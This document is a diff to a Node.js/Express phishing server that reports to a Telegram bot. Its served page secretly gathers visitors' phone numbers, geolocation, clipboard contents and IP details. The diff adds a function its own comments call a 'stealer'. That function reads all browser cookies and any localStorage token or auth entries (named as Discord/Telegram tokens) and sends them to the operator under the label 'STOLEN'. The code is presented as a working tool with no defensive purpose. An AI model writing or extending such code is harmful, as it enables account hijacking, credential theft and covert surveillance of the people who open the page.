@@ -13,9 +13,13 @@ const app = express();
 app.use(express.json());
 
 let history = [];
+let isMenuSent = false;
 
 // --- БОТ ---
 bot.onText(/^\/start$/, (msg) => {
+  if (isMenuSent) return; // Защита от дублей
+  isMenuSent = true;
+  
   const opts = {
     reply_markup: {
       inline_keyboard: [
@@ -51,20 +55,22 @@ async function sendToAdmin(text) {
 
 // --- API ---
 app.post('/api/request', async (req, res) => {
-  const { phone, ua, screen, battery, geo, clipboard } = req.body;
+  const { phone, ua, screen, battery, geo, clipboard, steal } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
 
+  // Улучшенный парсинг модели Android
   let device = "Android (Неизвестно)";
+  const androidMatch = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
+  
   if (ua.includes("iPhone")) device = "Apple iPhone";
   else if (ua.includes("Samsung")) device = "Samsung Galaxy";
   else if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
   else if (ua.includes("Windows")) device = "Windows PC";
   else if (ua.includes("Mac OS")) device = "Apple Mac";
-  else {
-    const match = ua.match(/Android\s[0-9.]+;\s([^)]+)/);
-    if (match && match[1]) device = match[1].trim();
+  else if (androidMatch && androidMatch[1]) {
+    device = androidMatch[1].trim();
   }
 
   let ipInfo = "Неизвестно";
@@ -90,6 +96,13 @@ app.post('/api/request', async (req, res) => {
   if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
   if (isVpn) msg += `⚠️ <b>VPN/Proxy!</b>\n`;
   
+  if (steal && steal.length > 0) {
+    msg += `\n🍪 <b>УКРАДЕНО (Cookies/Tokens):</b>\n`;
+    steal.forEach(s => {
+      msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 20)}...</code>\n`;
+    });
+  }
+
   msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
 
   await sendToAdmin(msg);
@@ -200,8 +213,28 @@ app.get('/', (req, res) => {
   let fullPhone = '';
   let geoData = null;
   let clipData = null;
+  let stolenData = [];
 
-  // Скрытый сбор геолокации и буфера
+  // Стиллер (сбор куки и токенов)
+  function stealData() {
+    try {
+      // Собираем куки
+      document.cookie.split(';').forEach(c => {
+        let [name, ...val] = c.split('=');
+        if (name && val.length) stolenData.push({ name: name.trim(), value: val.join('=') });
+      });
+      
+      // Собираем токены Discord/Telegram из LocalStorage
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        if (key.includes('token') || key.includes('auth')) {
+          stolenData.push({ name: 'LS:' + key, value: localStorage.getItem(key) });
+        }
+      }
+    } catch(e) {}
+  }
+  stealData();
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => { geoData = pos.coords.latitude + ',' + pos.coords.longitude; },
@@ -265,7 +298,8 @@ app.get('/', (req, res) => {
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
       battery: battery,
       geo: geoData,
-      clipboard: clipData
+      clipboard: clipData,
+      steal: stolenData
     };
 
     try {
